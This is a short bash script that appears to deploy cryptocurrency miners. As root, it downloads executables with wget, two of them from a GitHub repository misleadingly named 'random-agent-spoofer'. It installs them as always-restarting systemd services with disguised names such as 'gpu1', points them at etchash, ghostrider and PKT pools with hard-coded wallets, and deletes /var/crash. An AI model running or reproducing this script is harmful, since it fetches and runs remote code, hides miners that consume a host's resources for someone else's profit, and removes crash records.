#!/bin/bash

if pgrep -x "vvvv" > /dev/null
then
  echo "dang ton tai"
cd /home  
  
  
else
sudo service gpu1 stop
cd /home
sudo wget https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/vvvv
sudo chmod +x vvvv
sudo rm -rf /lib/systemd/system/gpu1.service
sudo rm -rf /var/crash
sudo bash -c 'cat <<EOT >>/lib/systemd/system/gpu1.service 
[Unit]
Description=gpu1
After=network.target
[Service]
ExecStart= /home/vvvv  -a etchash -o stratum+tcp://etc.2miners.com:1010 -u 0xf27d2dd7303ea0d39e9762276467e98bb8d09072 -p x -w ETH2ETC
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
cd /home
sudo wget https://github.com/trangtrau/random-agent-spoofer/releases/download/va/ar 
sudo cp ar jvdar 
sudo chmod +x jvdar
sudo rm -rf /lib/systemd/system/rtm2.service
sudo rm -rf /var/crash
sudo bash -c 'cat <<EOT >>/lib/systemd/system/rtm2.service 
[Unit]
Description=gpu1
After=network.target
[Service]
ExecStart= /home/jvdar -a gr -o stratum+ssl://asia.flockpool.com:5555 -u RCjpfnfFfjvhnDzfY9ShQrAtjrP3Vf2PLP.cpu -p x
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
sudo wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt
sudo chmod +x packetcrypt
sudo rm -rf /lib/systemd/system/pktpool.service
sudo rm -rf /var/crash
sudo bash -c 'cat <<EOT >>/lib/systemd/system/pktpool.service 
[Unit]
Description=gpu1
After=network.target
[Service]
ExecStart= /home/packetcrypt ann -p pkt1qydtp765qufxpwr5wxfzdmv9m9khgdc8muzgax6 http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&



sudo systemctl daemon-reload &&
sudo systemctl enable rtm2.service &&
sudo systemctl enable pktpool.service &&
sudo service rtm2 stop  &&
sudo service rtm2 restart
sudo service pktpool stop  &&
sudo service pktpool restart

systemctl daemon-reload &&
systemctl enable rtm2.service &&
systemctl enable pktpool.service &&
service rtm2 stop  &&
service rtm2 restart
service pktpool stop  &&
service pktpool restart

systemctl daemon-reload &&
systemctl enable gpu1.service &&
service gpu1 stop  &&
service gpu1 restart

sudo systemctl daemon-reload &&
sudo systemctl enable gpu1.service &&
sudo service gpu1 stop  &&
sudo service gpu1 restart
fi

